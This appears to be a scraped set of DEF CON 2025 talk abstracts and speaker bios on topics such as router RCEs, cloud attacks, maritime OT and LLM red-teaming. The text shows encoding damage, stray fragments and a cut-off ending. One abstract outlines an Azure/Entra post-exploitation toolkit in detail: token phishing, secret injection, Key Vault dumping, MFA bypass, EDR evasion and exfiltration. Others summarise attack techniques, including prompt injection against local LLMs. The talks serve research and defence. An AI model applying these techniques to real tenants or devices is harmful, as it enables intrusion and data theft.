Building on our prior DEFCON32 HHV presentation (https://www.youtube.com/watch?v=BiBMsw0N_mQ) on backdooring these devices, where we also exposed six vulnerabilities and released Draytek Arsenal (https://github.com/infobyte/draytek-arsenal), a toolkit to analyze Draytek firmware. We return with two new unauthenticated RCEs: CVE-2024-51138, a buffer overflow in STUN CGI handling, and CVE-2024-51139, an integer overflow in CGI parsing. When chained with our prior persistence techniques, these bugs enable a full device takeover and backdoor from the internet.

This talk provides an in-depth analysis of the new vulnerabilities and their exploitation strategies with demos and the full end-to-end exploitation chain. Weâll also explore their potential link to the mass Draytek reboot incidents of March 2025, suggesting that real-world exploitation of some of these vulnerabilities may already be underway.

Tags: Malware Village | Creator Talk/Panel
When: Saturday, Aug 9, 14:30 - 14:59 PDT
Where: LVCC West-Level 1-Exhibit Hall 1-303 (Malware Village) - Map

Description:
This talk unveils how a single OPSEC failureâa threat actor testing keylogging and infostealing malware on his own production systemâexposed an cybercrime operation in real time. By intercepting Telegram-based command-and-control (C2) communications, we gained direct access to screenshots and keylogs from the threat actorâs backend infrastructure, uncovering additional campaigns he was actively running. Weâll explore how Telegram bots were used to exfiltrate stolen data, how bot tokens were embedded within malware, and how YARA rules and VirusTotal were leveraged to trace and analyse related samples. This session combines technical insight with strategic takeaways, demonstrating how attackersâ dependence on mainstream platforms like Telegram can be turned against themâand how such real-world discoveries can reshape threat intelligence and bolster defensive strategies.

Description:
As the autonomous boat market has grown from nascent to ~$17 billion dollars, much of the infrastructure has gotten more and more accessible. Small flight controllers/autopilots are now only a click and configuration away. Servos, speed controllers and actuators have all seen wide adoption and open interfaces and standards. ArduPilot supports more control protocols in every release. 

Marine engines and outboard motors have remained stubbornly hard to control, and what control systems do exist are closed-source black boxes. Few if any vendors are ever given the full ICD for engine control and the vendors are frequently litigious with 3rd party accessory shops. While the safety concerns about running large gasoline or diesel engines autonomously are well-founded, the manufacturerâs could be substantially more open and encourage collaborative work with partners and hackers. 

This talk examines the current state of marine propulsion (outboard, inboard, steering, proprietary controls etcâ¦), where marine propulsion is going (metaphorically!) and how to hack it!
The reverse engineering can be as simple as read-the-manual and as complicated as having to buy a full engine setup. We will walk through a few specific examples from several vendors for several classes of vehicles from jet-skis to modern outboards. 
This talk showcases work that is currently in progress and would hugely benefit from the types of collaboration that occur at DefCon.

SpeakerBio:  Alex Lorman
Alex was born and raised in Washington, D.C.

Eventually he attended the Catholic University of American and graduated with a B.S. in Architecture.

He has worked on complex oil and gas projects in addition to his work in salvage, providing him the insight that the maritime world needed robotics, badly.

In 2014 he co-founded Sea Machines and moved to the Boston area to spearhead the effort.

He enjoys playing with cars, ships, bicycles and anything with a mechanical or electrical heart.

When the mission is launch-critical, time becomes a tactical asset. In this session, you'll learn how Defense Unicorns' Unicorn Delivery Service and NixOS work in unison to deliver secure, fully declarative softwareâon-prem or in disconnected, degraded, intermittent, and limited environmentsâin less than 24 hours.

What began with a record-breaking delivery for the U.S. Space Force at Cape Canaveral evolved into a new paradigm of software delivery that spread department-wide like wildfire. Operational timelines of critical-software used by warfighters is no longer measured in weeks or even days: it's hours, and soon to be minutes.

Join us to see how "T-Minus 24 Hours" isn't aspirationalâit's operational. Learn how this approach is transforming the way we deliver trusted, resilient software to the warfighter at mission speed.

Have you traveled and used in-flight internet services on airlines?  Guess whatâ¦Evil Twins have been discovered in the wild on commercial airlines.  This talk covers a tale of two people, the passenger in a rush to connect to in-flight services and the SOC analyst charged with the task of unraveling the truth.

This talk will introduce the many components that comprise the on-wing infrastrucutre and how they relate to the passengers as they journey through the skies.  Tasked with unraveling a tip, the SOC Analyst must understand the relationships of the pieces to the pizzle, from tying together the logged events and knowing what the infrastructure is on-wing, ultimately piecing together a bigger puzzle via other telemetry provided by ads-b, satellite or more.

The key takeaways Iâll be focusing on are what an analyst should do to prepare themselves to hunt in this arena, processing that evdence to support their hypothesis and unlock the truth behind that pesky browser portal that didnât feel right.  Joine me for a talk about Evil Twins in the sky!

With GenAI and LLM applications conquering the world at an unprecedented pace, the evolution of the new attack surface associated with these applications, puts a challenge to security practitioners in general, and specifically also for red-teams. GenAI security red-teaming can focus on three victim-objects; the LLM model itself, the prompt, and the entire application, with each of these having its own challenges and opportunities.

With a defender mindset, striving for utilization of red-teaming within the application development lifecycle in a manner that contributes to proactive security by providing actionable insights on fortifying the application, we will present a novel security approach, based on a triangle of tools: a) Threat-wise prompts red-teaming; b) Prompt hardening through prompt patching; c) Adversarially robust LLM that has high Security Steerability.

Where: LVCC West-Level 2-W222-W223 (Voting Village Talks ) W222 - Map

Description:
Across the world, ethical hackers and researchers working to improve election security often operate in legal gray zones. While the U.S. has seen high-profile efforts around voting machine testing, post-election audits, and researcher collaboration, many countries in the Global South still criminalize or discourage independent security testing even when it aims to protect democracy.In this talk, Iâll explore the legal and institutional risks faced by election security researchers in countries like Nigeria, where old cybercrime laws, state distrust, and political retaliation pose real threats. Iâll compare legal environments in the U.S. and emerging democracies, highlighting how Nigeriaâs laws suppress the same practices that once exposed major flaws in U.S. voting systems. Through case studies which include a vulnerable Nigerian biometric system that researchers were barred from testing, Iâll show how these legal risks leave democracies dangerously exposed. Attendees will leave with actionable strategies to advocate for global safe harbor protections, along with technical workarounds (e.g., End-to-end encrypted disclosure channels) for researchers operating under threat. This session argues to expand the âsafe harborâ concept to include not just vulnerability disclosures, but electoral research itself. I will outline how adapting U.S. safe harbor models (like those proposed in the ELECT Act) could protect researchers abroad while strengthening global election integrity by drawing parallels to Californiaâs Top-to-Bottom Review (TTBR). By bringing a Global South perspective to the Voting Village, this talk invites participants to consider a more inclusive and international approach to securing elections.

Description:
There's been remarkably little discussion about how mobile forensic tools fare against adversarially modified environments, particularly in terms of forensic reliability. Tools (and investigators) often assume that target devices function as expected, with minimal scrutiny of whether that assumption holds. Our research demonstrates otherwise - sophisticated anti-forensic techniques placed within Android devices can silently compromise evidence, placing longstanding investigative and extraction methodologies at risk.

Our research addresses a blind spot in Android logical extraction workflows - namely, an assumption that once mobile forensic software overcome the hurdle of device access, the extraction is assumed to follow correctly. While forensics software excel at getting a foot in the door, from our actual tests they offer little against stealthy, second-layer countermeasures that can silently manipulate or destroy data post-access.

Sector Down is a high-stakes, immersive multiplayer card game where critical infrastructure and cybersecurity collide. Designed for teams of 5, 10, 15, or 20 players, this simulation pits defenders and attackers against each other in a race against the inevitable: The Doom Clock.

ð¡ï¸Defend or Disrupt

Players are divided into two sides:
- Blue Team â Critical infrastructure defenders. Each Blue player manages a sector with three vital facilities: Physical, Network, and Financial. Their mission? Keep the systems alive and online while working together to run out the clock.
- Red Team â Offensive disruptors. Red players attempt to take down facilities using calculated cyberattacks and chaos tactics. Their goal: force sector collapses and trigger the Doom Clock.

â±ï¸ Time-Based Tactics

The game progresses in strategic phases where players draw cards, take action using worker tokens, and discard based on hand limits. Watch out for unpredictable âWhite Playsâârandom game events that add surprise twists every few rounds.

Description:
Referral Rewards Programs. Functionality that most probably view as boring and not worth the time looking at while hunting for bugs on a program. After a deep dive into the implementation of this functionality across dozens of programs, I found them to be hiding some very interesting bugs. My research uncovered various types of business logic flaws, race conditions, and even how the implementations created various client-side gadgets such as cookie-injection and client-side path traversal which could then be used as a part of a client-side chain. This research uncovered vulnerabilities in multiple large bug bounty programs.

Description:
Triage sits at the heart of every successful bug bounty and vulnerability disclosure program, yet it remains one of the most misunderstood and friction-heavy processes in our industry. As platforms scale to handle thousands of reports while maintaining quality and researcher satisfaction, the challenge isn't just operationalâit's fundamentally human.

This talk pulls back the curtain on modern triage operations, exploring how leading platforms structure their workflows, train their teams, and balance the competing demands of speed, accuracy, and community trust. We'll dive into the operational realities of scaling triage across diverse programs, the tools and processes that enable consistency, and the communication strategies that turn potential conflicts into collaborative dialogues.

Drawing from real-world experiences, we'll examine how platforms are evolving their approach to handle disagreements constructively, implement fair appeals processes, and gather meaningful feedback from researcher communities. We'll also look ahead to emerging technologies and cultural shifts that promise to reshape how triage operates.

Whether you're building a triage team, managing researcher relationships, or simply trying to understand why that report was closed, this session offers practical insights into creating triage processes that serve both security outcomes and human needs. Because great triage isn't just about finding the right answerâit's about building the trust and transparency that makes our entire ecosystem stronger.

Where: LVCC West-Level 3-W311 (Cloud Village Talks) - Map

Description:
This presentation aims to provide an actionable strategy to connect theoretical threat modelling frameworks and practical cloud implementations. We analyze why legacy approaches do not work for cloud-native applications, particularly microservices and serverless architectures. 

We will explore how to:
â¢ establish a realistic threat modelling schedule which provides real value lowering the risk of handling threat modelling as just a "tick-the-box" activity;
â¢        create effective cloud architecture diagrams to make it understandable and handy for developers to brainstorm possible threats;
â¢        implement effective system decomposition strategy to get rid of the monolithic threat modelling which fails for distributed cloud systems. We will demonstrate how this decomposition enables a targeted application of the STRIDE model, highlighting cloud-specific threat vectors and nuances, such as those arising in cross-tenant scenarios;
â¢        adapt DREAD risk evaluation framework for the cloud;
â¢        effectively engage stakeholders across development, security, and operations;
â¢      use AI as a starting point in threat modelling (demo included) and understand where human expertise remains critical.
We will make sure attendees gain a clear understanding of why traditional threat modelling is insufficient for modern cloud environments and will leave with a practical framework and techniques they can immediately apply to their own cloud deployments, improving their organization's security posture and reducing cloud-related risks.

Description:
Itâs not every day you stumble upon a technique that enables remote code execution (RCE) in thousands of AWS accounts at onceâbut thatâs exactly what happened with the whoAMI attack. By researching a known misconfiguration through a new lens, we discovered how to gain access to thousands of AWS accounts that unknowingly use an insecure pattern when retrieving AMI IDs. 

By carefully naming a malicious AMI, an attacker can trick vulnerable Terraform code, AWS CLI scripts, and even third-party CI/CD systems into running the wrong AMI. Iâll explain how I uncovered this vulnerability, show proof-of-concept demos, and share how I discovered this vulnerability affected a third party continuous integration platform used by many popular open source projects, and how even some of AWSâs own internal systems were vulnerable to this attack. 

If youâve ever launched an EC2 instance, this talk is for you: learn how cloud image name-confusion attacks can be used by attackers to gain initial access to cloud environments and how you can prevent them.

Welcome to the next phase of decentralized threats. 

This sequel to âMFT: Malicious Fungible Tokensâ explores how distributed data replication systems can be used for malicious purposes. Weâll demonstrate how technologies like Codex, WhenFS, IPFS, and Cloudflare R2 buckets can store and distribute C2 commands, payloads, and even phishing campaigns such as templates or client-side drainers. These systems enable infrastructures that are resistant to takedowns and, in some cases, nearly unstoppable. Through practical examples and live demonstrations, weâll uncover the risks these systems pose and discuss their implications for security teams.

This talk is a continuation of "Everything is a C2 if you're brave enough" from Red Team Village and "MFT: Malicious Fungible Tokens" from Adversary Village, which explains how to turn NFTs into immortal C2 Servers. It is not needed to have attended these talks as a short recap will be featured.

Description:
Browser extensions have become increasingly popular for enhancing the web browsing experience. Common examples are ad blockers, cryptocurrency wallets, and password managers. At the same time, modern websites frequently display intrusive elements, such as cookie consent banners, newsletter subscription modals, login forms, and other elements that require user interaction before the desired content can be displayed.

In this talk, I will present a new technique based on clickjacking principles that targets browser extensions, where I used fake intrusive elements to enforce user interaction. In my research, I tested this technique on the 11 most widely used password managers, which resulted in discovering multiple 0-day vulnerabilities that could affect tens of millions of users. Typically, just one click was required from a user to leak their stored private information, such as credit card details, personal data or login credentials (including TOTP). In some cases, it could lead to the exploitation of passkey authentication.

The described technique is general and can be applied to browser extensions beyond password managers, meaning other extensions may also be vulnerable to this type of attack. In addition to describing several methods of this technique, I will also recommend mitigations for developers to protect their extensions against this vulnerability.

Description:
Bare metal cloud providers are rapidly gaining popularity among organizations deploying high-performance machine learning workloads. While the promise of dedicated hardware and enhanced security may appear attractive, a closer look revealed that these environments are vulnerable to decades-old attacks that are sure to trigger nostalgia.

This talk investigates the hidden risks posed by the "bare metal" trend, illustrating how weaknesses in firmware, hardware, and the network can lead to catastrophic multi-tenant compromise. We'll walk through real-world case examples demonstrating how attackers can leverage these vulnerabilities including hijacking provisioning processes, installing persistent firmware implants, intercepting sensitive network data, and compromising secure machine learning workflows.

Attendees will gain insight into the unique attack surfaces of bare metal environments, understand why seemingly outdated techniques remain highly effective, and learn how major cloud providers mitigate these threats. Expect technical demonstrations, practical advice on evaluating providers, and recommendations for protecting your organization's critical infrastructure.

Description:
Many organisations are moving to Zero Trust Network Access (ZTNA) and Secure Access Service Edge (SASE) solutions in response to the real and well-documented risks associated with traditional VPNs. These cloud-era alternatives promise improved security through finer-grained access controls and better posture enforcement. But are these 'next-gen' cloud VPNs truly secure? In this 45-minute session, we present new research revealing that many leading ZTNA platforms - including offerings from ZScaler, Netskope and Check Point - inherit legacy VPN weaknesses while introducing fresh cloud-based attack surfaces.

We demonstrate the process of external recon, bypassing authentication and device posture checks (including hardware ID spoofing) and abuse insecure inter-process communication (IPC) between ZTNA client components to achieve local privilege escalation. We show it is possible to circumvent traffic steering to reach blocked content, exploit flaws in authentication flows to undermine device trust, and even run malicious ZTNA servers that execute code on connecting clients. Throughout the presentation, we highlight previously undisclosed vulnerabilities identified during our research. Zero trust does not mean zero risk.

Description:
Yaroslav Vasinskyi was sentenced in 2024 to 13 years in U.S. federal prison for his role in the $700M Kaseya ransomware attack. But behind the headlines lies a more human and complex story. Over the past year, threat researcher Jon DiMaggio built a relationship with Vasinskyi, speaking with him regularly by phone and email. Joining him is John Fokker, Head of Threat Intelligence at Trellix and former Dutch cybercrime investigator involved in operations targeting the REvil gang with global law enforcement.

This talk reveals how REvil operated from the inside, what really happened behind the Kaseya attack, and how ego, greed, and betrayal tore the crew apart. The session also provides new information on the groupâs leadership, who vanished and remain at large.

This isnât theory or speculation. It is raw human intelligence, operational insight, and criminal context behind one of the most devastating ransomware attacks in history. It also tells Vasinskyiâs personal journey, revealing the often overlooked human side of ransomware crime.

Coinciding with the next Ransomware Diaries release, this talk exposes the inner workings and unraveling of one of the most infamous ransomware groups of all time. This is not a glorification, it is a reckoning.

Description:
For those ambitious threat actors targeting on OT/ICS field, their actions invariably are highly intensity planed to produce successful hacking. By abusing multiple misconfigurations and benign OT-specific nature infrastructure to evade multiple layers of protection, they can stealthily control the factoryâs essential assets from IT to OT fields. For example, according to Mandiantâs report, the Russian hacker group, Sandworm, abused OT-level LoTL (Living Off the Land) to disrupt power in Ukraine. The key to success is abusing those OT-specific protocols, techniques, and LOLBins which are difficult to detect as malicious by modern AV/EDR.

In this research, instead of detecting MALICIOUS, we propose a novel multimodal AI detection, Suspicious2Vec, which archives contextual comprehension on process integrity and suspicious behaviors of OT/ICS benign operation. We use the AI model on large-scale real-world factories, to create a baseline of universal nature OT-specific operating into numerical vectors and success filter in-the-wild anonymous abuse for attacks into malicious.

From July 2023 to July 2024, our experiment whole year to received 2,000,000 data which were detected as unique suspicious techniques by 562+ human-written expert rules. We use the AI model to project those suspicious actions into numerical vectors by well-known word embedding methods, and also model all the suspicious behaviors from the OT + IT malware family from VirusTotal to generate a set of malware templates as neural ASR (Attack Surface Reduction) rules for detection, and success capture 12+ variant OT malware from 52,438 factory program files.

IoT environments generate massive, noisy streams of logs and alertsâmost of which lack the context needed for meaningful detection or response. This talk introduces a novel, LLM-free approach to large-scale alert contextualization that doesn't rely on writing complex queries or integrating heavy ML models. Weâll demonstrate how lightweight, modular correlation logic can automatically enrich logs, infer context, and group related events across sensors, devices, and cloud services. By leveraging time, topology, and behavioral attributes, this method builds causality sequences that explain what happened, where, and whyâwithout human-crafted rules or expensive AI inference. Attendees will walk away with practical techniques and open-source tools for deploying contextualization pipelines in resource-constrained IoT environments. Whether you're defending smart homes, industrial OT networks, or edge devices, you'll learn how to extract insight from noiseâfast.

Role-Based Access Control (RBAC) is the final layer of defense between a compromised Kubernetes workload and a full-scale cluster breach. Yet real-world RBAC configurations, especially those shipped by popular open-source operators and Helm charts, are rarely reviewed with an adversarial mindset.x000D
x000D
In this talk I introduce RBAC ATLAS, a curated index of identities and RBAC policies found in popular Kubernetes projects. Powered by rbac-scope, a purpose-built static analyzer I created, RBAC ATLAS enriches each policy with security annotations highlighting granted permissions, over-privileged resources, lateral-movement pivots and abuse primitives.x000D
x000D
The talk begins with a concise RBAC 101, explaining the common misconfigurations that transform a supposedly âleast-privilegeâ setup into de facto cluster-wide root. We will then pivot to thinking like the adversary, demonstrating how attackers chain cluster-role impersonation, secret exfiltration, and CRD-based privilege-escalation techniques to gain lateral movement. Next, we will open the hood on rbac-scope, showing how its analysis pipeline and scraping workflows automatically surface risky policies. Finally, We will discuss key findingsâcalling out the riskiest projects I analyzed, the permission patterns distilled from analyzing over 100 policy objects, and concrete ways attackers and defenders can feed these insights into their daily security operations.

Description:
Maritime vessel controls and operational technology (OT) systems are getting more complex and interconnected. With industry trends aiming to reduce crew, automate tasks, and improve efficiency, these networks are expanding in scale, intricacy, and criticality for vessel operation and maintenance. The standard controller area network (CAN) bus for maritime vessel networks, developed by the National Marine Electronics Association (NMEA), known as NMEA2000. NMEA2000 is an application layer network protocol built on the ISO11783 standard and compatible with automotive SAEJ1939, it uses unique message identifiers known as Parameter Group Number, to define the data within each communication frame. Despite its widespread use, NMEA2000 remains a relatively unexplored domain, particularly in understanding normal versus abnormal network behavior, due to the unavailability of open-source datasets. To address this gap, we constructed a NMEA2000 system consisting of five nodes: GPS/Radar, Wind Speed/Direction sensor, and Multifunction Display. Using this setup, we collected datasets to analyze system behavior and developed deterministic fingerprints for each sensor, establishing a baseline of the normal operating system. We subject the system to controlled attacks to evaluate the accuracy and effectiveness of the fingerprints. This work represents a foundational step towards enhancing security and reliability in maritime OT systems.

Description:
Current ship simulators are designed to help masters and mates pass their STCW exams. They were never designed for cybersecurity use. So, here is the interesting question that will be considered during the presentation. What is the ideal architecture of a virtual ship environment for cybersecurity education, assessment, and research use? Recent work at UNCW suggests there is a need for a hybrid virtual environment comprised of a full mission (above and below the waterline) ship simulator coupled with sub-system device emulators and specialized software applications. Examples of required device emulators include communication devices, bridge instruments, and industrial controllers. Coupling can be accomplished through logical or physical means. Examples of specialized software applications include network traffic generation, strategically located test access points for staging exploits, cyber data analytics, and trainer control over directed simulations. Cybersecurity use cases are being used to help shape derivative functional requirements. Rather than develop a novel virtual environment from scratch, UNCW has been looking into the feasibility of augmenting an existing, commercially available ship simulator with new functionality such that it is fit for cybersecurity use. Unitestâs, Winterthur X92 marine engine simulator is an ideal candidate that will be briefly demonstrated during the presentation.

Where: LVCC West-Level 1-Exhibit Hall 1-206 (Quantum Village) - Map

Description:
This talk aims to educate the participants about security of quantum computing systems.

Why?

Today, quantum computers are deployed online without any security mechanisms. Researchers have been able to present crosstalk and other attacks without really violating any protection mechanisms, because there are none. Having learned from classical security that it takes many years to find and patch hardware-related problems, think Spectre or Rowhammer attacks that are actually still not patched, we need to study and educate people about quantum computer security now, so security mechanisms can be designed and deployed before quantum computers are widely spread.

What?

The talk will focus on crosstalk attacks, which have many similarities to Rowhammer in classical computers, at least in the way they behave conceptually. The talk, and brief demonstration, will be focusing on cloud-based quantum computers to show effects of crosstalk. This will make the audience consider implications of shared quantum computers, how and if multi-tenant computers should be deployed, and in general understand that the noisy and fundamentally analog nature of the machines opens them up to various security threats.

Whom?

The talk will be aimed at anyone interested in security. By focusing on code examples and brief demonstration, the talk will be sort of demonstration based, rather than physics or math based. Fundamentally, quantum computer is just a computer, and hackers and others interested in security should not need to worry about the physics before jumping into evaluating, testing, and eventually helping to secure these systems by understanding how they can break or be attack.

How you're going to give the talk?

The talk will be an interactive presentation. It will be based on slides, but audience can ask questions, etc., there will be small demo during the talk. Quantum computer experiments will be run live, but due to long queues, pre-recorded data will be used to analyze the results if the online demo does not finish in time. Code will be posted online for others to try at home. While I cannot guarantee it, I will work with qBraid to provide some quantum credits and perhaps participants can run the code in parallel to the demo. I hope this is an educational, interactive, mini-lecture on crosstalk attacks.

Once built, analysts can run complex SPARQL queries against their local triplestore without external dependencies or operational security concerns.

Tags: Red Team Village | Creator Event
When: Saturday, Aug 9, 15:00 - 16:50 PDT
Where: LVCC West-Level 1-Exhibit Hall 1-405 (Red Team Village)-RTV Tactics 2 - Map

Description:
Operating with modern red team tools has a lot of ins, a lotta outs, a lotta what-have-yous. If you were like me before operating with tools like Mythic, managing your projects with Ghostwriter, and analyzing your data automatically with Nemesis, you were probably living in the past and piecing things together manually, writing things down in a tedious, un-zen lack-of-system that would leave you scrambling at the end of testing, when your report should be about to go to a peer review or QA. 

You might be saying, "But Michael, I like doing things manually and wasting mine and my client's time." Yeah, well, you know, that's just, like, your opinion, man. 

That is entering a world of pain. I don't know about you, but when that's happening, I feel really out of my element. 

Luckily, Mythic, Ghostwriter, and Nemesis really tie the room together and are a huge quality-of-life boost. No more will you say to yourself, "This aggressor script will not stand, man!" Sometimes the bear eats you, but it's high time you eat the bear. 

Get ready to be bowled away by a modern approach to managing your red team operations with tools like Mythic, Ghostwriter, and Nemesis (or whatever else you can think of to plug into these tools' APIs if you're note into the whole brevity thing) to streamline your workflow. 

You might get so excited that you'll flail your arms around in joy - but be careful man, there's a beverage here! 

SpeakerBio:  Michael Donley
Michael is an Adversary Simulation Consultant at SpecterOps, where he deals in testing all the things - networks, web apps, Kubernetes clusters, humans, physical sites, and especially the potency of energy drinks. 

He is the Director of Volunteers for the Red Team Village and loves helping people new to the field (especially career changers) find their foothold in the infosec industry. 

When he's not hacking stuff or learning about new things, he is a drummer for just about any improv show in Chicago that has music in it.

Description:
Over the past few years, we've really seen API hacking take off as a field of its own, diverging from typical web app security, but yet parallel to it. Often we point to the amorphous blob that is web security and go: "here you go, now you can be a hacker too", with top 10 lists, write-ups, conference talks and whitepapers smiling as we do. This creates a major challenge for developers who want to test their APIs for security or just people who want to get into API hacking, how on earth do you wade through all the general web security to get to the meat of API hacking, what do you even need to know? This talk is going to break down API hacking from a developer point of view, teaching you everything you need to know about API hacking, from the bugs you can find and to the impact you can cause, to how you can easily test your own work or review your peers. So what are you waiting for join me and go hack yourself!

uncovered a mis-routed SIP policy on O2âs IMS core that let any device on the data network bypass the P-CSCF firewall and inject raw SIP traffic directly into the S-CSCF. A proof-of-concept âsilent dialerâ malware exploited the gap to auto-REGISTER rogue identities, issue INVITEs that redirected live VoLTE calls, and siphon RTP audioâwhile every packet looked like normal internal signaling. No internet, VPN or root exploits were needed; the flaw lived entirely in the operatorâs own trust model, proving how a single IMS rule slip can open the door to full-scale voice and data surveillance.

Description:
While cloud-native AI dominates security discussions, desktop appsâstill vital in engineering, design, and financeâare quietly evolving. No longer just âlegacy,â they now embed local LLMs, predictive UIs, automation, and offline inference.

This talk reframes AI security for desktop environments. Weâll explore new risks: prompt injection in on-device models, adversarial inputs, inference abuse, and insecure plugins. These threats donât replace traditional flaws like memory corruption or unsafe parsingâthey amplify them.

Weâll demo prompt injection on a local LLM and file-format fuzzing causing legacy crashes. Then weâll cover AI-aware threat modeling, including tampered models and insecure automation. If you think desktop app security is solved, this talk will challenge thatâand offer tools to secure hybrid software at the AI + legacy intersection.

Description:
In todayâs bug bounty landscape, advantage goes to those who can see what others miss. The OWASP Amass Project has long equipped researchers with powerful tools for internet asset discovery, but its newest additionâassocâtakes things to the next level. This talk introduces assoc, a tool that allows hunters to explore the Open Asset Model through custom association triples, a concept inspired by RDF triples used in knowledge graphs. These user-defined relationships enable highly targeted queries across a rich graph of internet data, revealing non-obvious associations between domains, IP addresses, certificates, and legal entities. 

Attendees will learn how assoc empowers them to define their own asset discovery logic, conduct complex association walks through the graph, and surface infrastructure that traditional scanners and passive methods overlook. Whether you're pivoting off a supplierâs ASN, correlating certificate reuse across sub-brands, or mapping out a shadow IT network tied to a legal entity, assoc offers an unmatched level of flexibility and precision. Live demos will show how to craft custom triples, execute walks, and extract actionable intelligenceâall with an eye toward real-world bug bounty impact. If you're ready to out-hack the competition, this is a talk you wonât want to miss.

Tags: Cloud Village | Creator Talk/Panel
When: Saturday, Aug 9, 16:35 - 17:05 PDT
Where: LVCC West-Level 3-W311 (Cloud Village Talks) - Map

Description:
As orgs lean harder on Entra and Azure for critical IdP and infra, attackers are shifting too. This talk introduces a PowerShell-based post-exploitation toolkit that uses only native Windows features and the Microsoft Graph API â no external modules, agents, or DLLs required. Designed to âlive off the Graph,â it enables stealthy recon, escalation, persistence, and exfil using just REST calls and default PowerShell, evading top EDRs with ease (as of April 2025, at least).

Weâll walk through real-world kill chains using Microsoftâs own APIs, abusing OAuth flows, consent, and service principal escalation to move laterally, assign roles, drop loot, and stay hidden. Attendees will learn how attackers can inject secrets into app registrations, enumerate high-privilege service principals, assign Entra + Azure roles via Graph/ARM, and exfiltrate via tenant-native blob storage - all without touching the Azure portal or importing a single module.

No implants. No imports. No sketchy domains. Just whatâs already there.

To ground the talk, Iâll give a short crash course on Azure OAuth, app types, API endpoints, and how attackers bypass common controls like MFA, CAP, and Token Policies.

A full lab demo will show how access is gained via spear-phishing, followed by escalation and persistence using only built-in PowerShell. Blue teamers will walk away with concrete detection ideas. Red teamers will leave with a frameworkâor inspiration to build their own.

Toolkit Breakdown

Requirements:
- PowerShell execution
- Internet access to Azure APIs
- A juicy Azure target

Auth:
- Spear-phish via Microsoftâs Device Code Auth (popularized by Russian APTs this year)
- Store tokens in a native JSON-based keyring
- Tag tokens by role for scope tracking

Recon:
- Enumerate Service Principals + Graph scopes (regex filtering)
- Enumerate ARM role assignments (regex filtering)
- Enumerate Key Vaults
- Identify attack paths from collected data

Persistence:
- Create malicious apps
- Inject secrets into any apps
- Add remediation tasks
- Spawn containers/functions

Escalation:
- Use keyring + recon to select injection targets
- Pivot via apps to bypass CAP/MFA/token policies
- Dump Key Vaults
- Rotate identities mid-chain
- Assign permissions to any app

Exfil:
- Recon modules write loot as .csv
- Create public Azure blob storage
- Upload loot directly

Stealth:
- No compiled codeâjust .ps1, .json, .csv
- Built-in PowerShell + REST only
- Avoids PowerShell and module-based detections
- No alerts from CrowdStrike, Defender, or SEP in testing

Automation:
- Spear-phish module auto-generates lures and captures tokens
- One-shot persistence module sets up a cron-style enumerate+dump pipeline in cloud containers
- One-shot exfil module creates resources, publishes open loot container
- Operator just selects targets/IDs

This tool is actively developed by me. Nobodyâs seen it in action yetâexcept my girlfriend and my cats. Been saving it for DEFCON :)

SpeakerBio:  Trevor
I'm a lifelong hacker and technology enjoyer, with a passion for automation and expanding my knowledge of new systems. I got started with "security" as a preteen, hacking with BackTrack and taking advantage of the relatively insecure implementations that were pervasive in the early 2000s. After finishing school, I started working in IT and eventually moved into cybersecurity professionally.

Fast forward to 2025: I'm currently a Lead Security Engineer at Wells Fargo, focusing on adversary emulation and offensive security research. In this role, I create PoCs and tools to exploit the latest vulns and bypass EDR, and I train junior engineers and analysts on complex techniques and topics. The tooling and training I provide typically illustrate full kill chains, empowering them to hunt and respond with speed and precision.

Prior to my current role, I worked as a Senior Cloud Security Engineer at Wells Fargo, focusing heavily on blue teamâoriented Azure operations. Much of the inspiration for this tool and demo comes from the experience I gained working in the Bank's highly restricted, federally regulated environment. Before Wells Fargo, I was at Sony (PlayStationâthe cool one :P) as an L3 Sysadmin, and at Kudelski Security (an MSSP) as a Security Engineer supporting dozens of massive clients around the globe. Thanks to that prior experience, Iâve had the privilege of being exposed to a wide variety of environments and tooling, which I'm grateful for.

Outside of work, I'm either studying (GXPN currently) or in the lab developing my own projects, researching, building, breaking, etc.

Unrelated, but Iâve also been DJing at DEFCON for the last few years, so Iâm especially hyped to level up my participation and submit a talk/demo for my favorite village. DEFCON pushed me further down this path early on, and Iâm ready to give back. Besides computers, Iâm also very into fast cars and massive sound systems. 

When it comes to offensive ops: living off the land is the motto, exploitation is the mission, automation is the lifestyle.

Description:
What does the "perfect" CI/CD pipeline look like, especially one built with security at its core? This hands-on workshop explores that ideal using readily available open-source tools. We'll dissect the essential stages of a modern pipeline, demonstrating how to integrate security seamlessly throughout the development lifecycle (DevSecOps).

Through practical, step-by-step guidance, we'll implement key security checks like iinfrastructure vulnerability scanning, secrets detection and code analysis using popular OSS tools within a functional pipeline. We wonât forget about the pipeline security itself, we will review best practices to secure our CI/CD process. While we'll showcase specific tools and configurations, the goal is not just replication, but understanding how and why these security controls work.

Discover the underlying principles of secure pipeline design and leave with actionable techniques to start building your own hardened, practical CI/CD pipeline.

Outline:


Introduction


Brief presenter introduction.
Setting the stage: The need for secure CI/CD pipelines.
Fundamentals Recap:
Quick overview: What is Continuous Integration, Continuous Deployment and Continuous Security?

Scope & Learning Objectives


Workshop Focus: Demonstrate building a "perfect" (secure and practical) CI/CD pipeline using open-source tools.
Key Goal: Inspirational, not prescriptive. Attendees should understand the principles and identify modular components they can adapt to their own environments. The aim is to grasp the idea of a secure pipeline, not to replicate this specific example verbatim.
Learning Outcomes: Attendees will understand the key stages of a secure pipeline, know relevant OSS tools for each stage, and grasp the principles needed to start building or improving their own secure CI/CD process.
Out of Scope (What this workshop is NOT):
Deep dives into specific development workflows (e.g. Gitflow, Trunk-based).
Focus on a specific application technology stack (language/framework agnostic where possible).
A definitive statement on the "best" tools (alternatives will be mentioned for key steps).
Assumption: We will work from a simplified "greenfield" perspective for clarity.

"Perfect Secure Pipeline" Overview


Visual explanation of the "perfect" pipeline stages.

Secure Pipeline Step-by-Step Breakdown (Hands-On)


For each key stage (e.g., Pipeline Scan, IaC Scan, Container Scanning, Secrets Detection, SAST/SCA):
Goal: What security risk are we trying to mitigate with this step?
OSS Tool Demo of the chosen open-source tool (e.g., Chekov for IaC, Trivy for container scanning, Gitleaks for secrets). Briefly mention 1-2 alternatives.
Live Demo - Break & Fix:
Pipeline without the check -> potential security failure.
Integrate OSS security tool into the pipeline.
Trigger pipeline again -> security issue found.
Fix the issue.
Re-run pipeline -> successful pass.


For time reasons, we will focus specially in Pipeline Security, Infra as Code scan, Container Scan and Secrets Detection steps.

Description:
AWS Security MCP(Model Context Protocol) Server - is a tool I've built that fundamentally changes how security teams interact with their AWS environments. Instead of wrestling with the AWS CLI or sifting through thousands of findings from traditional scanners, you can simply talk to your AWS infrastructure using natural language.

This project connects AI assistants like Claude directly to your AWS account, enabling you to:

